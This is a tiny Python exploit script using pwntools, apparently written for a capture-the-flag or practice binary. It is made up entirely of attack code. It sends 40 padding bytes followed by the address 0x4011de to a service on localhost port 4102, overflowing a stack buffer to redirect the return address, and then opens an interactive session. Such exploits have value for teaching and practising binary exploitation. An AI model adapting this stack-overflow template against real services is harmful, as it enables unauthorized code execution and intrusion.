from pwn import *

hensu = ('a'*(0x20+8) + "\xde\x11\x40\x00\x00\x00\x00\x00")

io = remote('localhost',4102)
io.sendline(hensu)
io.interactive()
